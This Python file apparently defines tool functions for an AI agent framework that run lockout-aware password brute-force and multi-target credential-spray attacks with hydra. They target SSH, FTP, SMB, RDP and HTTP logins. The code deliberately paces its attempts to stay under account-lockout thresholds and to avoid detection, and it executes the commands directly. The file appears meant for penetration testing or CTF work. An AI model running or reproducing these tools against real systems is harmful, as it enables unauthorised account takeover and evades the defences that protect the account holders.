"""Smart password attacks — lockout-aware brute force and credential spraying."""

from kryon.sdk.agents import function_tool
from kryon.tools.common import run_command


@function_tool
def smart_password_attack(
    target: str,
    service: str,
    strategy: str = "auto",
    lockout_threshold: int = 5,
    lockout_window_minutes: int = 30,
    delay: float = 1.0,
    ctf=None,
) -> str:
    """
    Run a lockout-aware password attack against a service.

    Automatically adjusts timing and attempt counts to avoid
    triggering account lockout policies.

    Args:
        target: Target host or URL
        service: Service type (ssh, ftp, smb, rdp, http-form, http-basic)
        strategy: Attack strategy (auto, dictionary, spray, targeted)
        lockout_threshold: Max attempts before lockout (default: 5)
        lockout_window_minutes: Lockout reset window in minutes
        delay: Delay between attempts in seconds
        ctf: CTF context

    Returns:
        str: Attack results with any discovered credentials
    """
    # Calculate safe attempt parameters
    safe_attempts = max(1, lockout_threshold - 2)  # Stay under threshold

    service_config = {
        "ssh": {"hydra_module": "ssh", "port": 22},
        "ftp": {"hydra_module": "ftp", "port": 21},
        "smb": {"hydra_module": "smb", "port": 445},
        "rdp": {"hydra_module": "rdp", "port": 3389},
        "http-basic": {"hydra_module": "http-get", "port": 80},
        "http-form": {"hydra_module": "http-post-form", "port": 80},
    }

    config = service_config.get(service)
    if not config:
        return f"Error: Unknown service '{service}'. Supported: {', '.join(service_config.keys())}"

    # Build hydra command with lockout-aware parameters
    cmd_parts = [
        "hydra",
        "-t 1",  # Single thread to respect delays
        f"-W {delay}",  # Wait between attempts
        "-F",  # Stop on first found
        "-o hydra-results.txt",
    ]

    if strategy in ("auto", "dictionary"):
        cmd_parts.extend(
            [
                "-L /usr/share/seclists/Usernames/top-usernames-shortlist.txt",
                "-P /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt",
            ]
        )
    elif strategy == "spray":
        cmd_parts.extend(
            [
                "-L /usr/share/seclists/Usernames/top-usernames-shortlist.txt",
                "-p 'Password123!'",
            ]
        )

    cmd_parts.append(f"{target}")
    cmd_parts.append(f"{config['hydra_module']}")

    result_parts = [
        f"Smart Password Attack: {target}:{service}",
        f"Strategy: {strategy}",
        f"Lockout threshold: {lockout_threshold} attempts / {lockout_window_minutes}min",
        f"Safe attempts per account: {safe_attempts}",
        f"Delay: {delay}s between attempts",
        "---",
    ]

    output = run_command(" ".join(cmd_parts), ctf=ctf)
    result_parts.append(output)

    return "\n".join(result_parts)


@function_tool
def credential_spray(
    targets: str,
    service: str,
    password: str,
    username_list: str = "",
    delay_seconds: float = 2.0,
    max_attempts_per_target: int = 3,
    ctf=None,
) -> str:
    """
    Run a multi-target credential spray attack.

    Sprays a single password across multiple targets and usernames,
    with configurable delays to avoid detection and lockouts.

    Args:
        targets: Comma-separated list of target hosts
        service: Service type (ssh, smb, rdp, ftp)
        password: Password to spray
        username_list: Path to username list or comma-separated usernames
        delay_seconds: Delay between targets
        max_attempts_per_target: Max attempts per target
        ctf: CTF context

    Returns:
        str: Credential spray results
    """
    # Dedup: a repeated host in the CSV would run a FULL hydra credential-spray
    # against it twice — double load and, worse, double the account-lockout risk
    # (critical in banking engagements). Normalize before the expensive loop.
    target_list = list(dict.fromkeys(t.strip() for t in targets.split(",") if t.strip()))

    if not username_list:
        username_list = "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"

    results = [
        f"Credential Spray: {len(target_list)} targets",
        f"Service: {service}",
        f"Password: {'*' * len(password)}",
        f"Delay: {delay_seconds}s between targets",
        "---",
    ]

    for target in target_list:
        cmd = f"hydra -L {username_list} -p '{password}' -t 1 -W {delay_seconds} -F {target} {service} 2>/dev/null"
        output = run_command(cmd, ctf=ctf)
        results.append(f"\n[{target}]\n{output}")

    return "\n".join(results)
